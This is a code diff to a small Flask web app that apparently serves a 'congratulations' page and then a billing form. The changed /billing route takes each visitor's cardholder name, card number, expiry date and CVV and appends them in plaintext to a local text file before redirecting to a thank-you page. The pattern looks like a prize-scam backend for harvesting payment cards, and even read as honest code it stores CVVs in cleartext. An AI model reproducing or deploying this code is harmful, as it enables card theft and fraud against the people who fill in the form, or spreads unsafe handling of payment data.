@@ -8,10 +8,29 @@ def index():
     # Serve the main congratulations page
     return render_template('Qaseh.html')
 
-@app.route('/billing')
+# Define the path to save the billing data
+SAVE_PATH = 'billing_data.txt'
+
+@app.route('/billing', methods=['POST'])
 def billing():
-    # Serve the billing page
-    return render_template('billing.html')
+    # Get the form data
+    cardholder = request.form.get('cardholder')
+    cardNum = request.form.get('cardNum')
+    cardexpiry = request.form.get('cardexpiry')
+    cvv = request.form.get('cvv')
+
+    # Prepare the data to write to the file
+    billing_data = f"Cardholder: {cardholder}\n"
+    billing_data += f"Card Number: {cardNum}\n"
+    billing_data += f"Card Expiry: {cardexpiry}\n"
+    billing_data += f"CVV: {cvv}\n\n"
+
+    # Write the data to the file (appending each time)
+    with open(SAVE_PATH, 'a') as file:
+        file.write(billing_data)
+
+    # Redirect to the thank you page
+    return redirect(url_for('alhamduliah'))
 
 @app.route('/alhamduliah')
 def alhamduliah():
